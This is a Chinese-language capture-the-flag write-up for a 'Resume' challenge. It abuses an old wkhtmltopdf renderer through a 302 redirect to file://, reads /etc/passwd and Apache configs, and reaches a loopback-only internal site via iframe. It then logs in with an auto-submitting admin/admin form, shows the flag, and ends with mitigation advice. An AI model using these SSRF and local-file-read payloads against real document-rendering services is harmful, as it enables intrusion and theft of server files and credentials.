# Resume

## 题目简述

WelcomeCTF2021 的 Resume 允许用户提交简历内容，后端把内容嵌入 HTML，再调用旧版 `wkhtmltopdf` 生成 PDF。渲染器能够访问服务器本地文件和仅监听回环地址的站点，因此攻击者可通过可控 HTML 让“服务器内的浏览器”读取内网资源，最终自动登录内部站点。

## 解题过程

直接使用 `<iframe src="file:///etc/passwd">` 会被拦截，但旧版渲染器会跟随 HTTP 302 跳转到 `file://`。在攻击者控制的 HTTP 端点返回：

```http
HTTP/1.1 302 Found
Location: file:///etc/passwd
```

再把该 HTTP 地址放入 iframe，生成的 PDF 就会包含本地文件内容。也可以在渲染页面中使用 `XMLHttpRequest` 读取 `file://`，并把响应显示在文档或发送到自有接收端。

首先读取 `/etc/hosts`，得到：

```text
127.0.0.1 topsecret.local
```

该虚拟主机仅监听 `127.0.0.1:80`，外部修改 Host 头无法访问，但 `wkhtmltopdf` 运行在服务器内部，可以渲染：

```html
<iframe src="http://topsecret.local" width="600" height="600"></iframe>
```

接着利用本地文件读取依次检查 Apache 配置：

```text
/etc/apache2/apache2.conf
/etc/apache2/sites-enabled/topsecret.local.conf
```

配置泄露文档根目录 `/var/www/70p53CR37/`。读取其中的 `index.html` 后，得到登录表单的真实字段名：

```text
username_VmyK7y39pX99A
password_6FB8YUthKI3dK
```

内部站点使用弱口令 `admin/admin`。把自动提交表单作为简历 HTML 的一部分：

```html
<form id="login" action="http://topsecret.local/login.php" method="POST">
  <input name="username_VmyK7y39pX99A" value="admin">
  <input name="password_6FB8YUthKI3dK" value="admin">
</form>
<script>
document.getElementById("login").submit();
</script>
```

渲染器在内网环境中提交表单，登录响应被写入生成的 PDF，显示：

```text
greyhats{7h12_12_MOr3_7HaN_AN_55rf}
```

## 方法总结

本题不仅是一次简单 SSRF，而是把攻击者 HTML 交给了位于内网的完整浏览器型渲染器。利用链包含 302 到本地文件、主机配置枚举、回环虚拟主机访问、弱口令和自动表单提交。安全生成 PDF 时应升级渲染器、禁用本地文件访问和脚本、隔离网络命名空间，并避免让渲染进程接触内网凭据与服务。
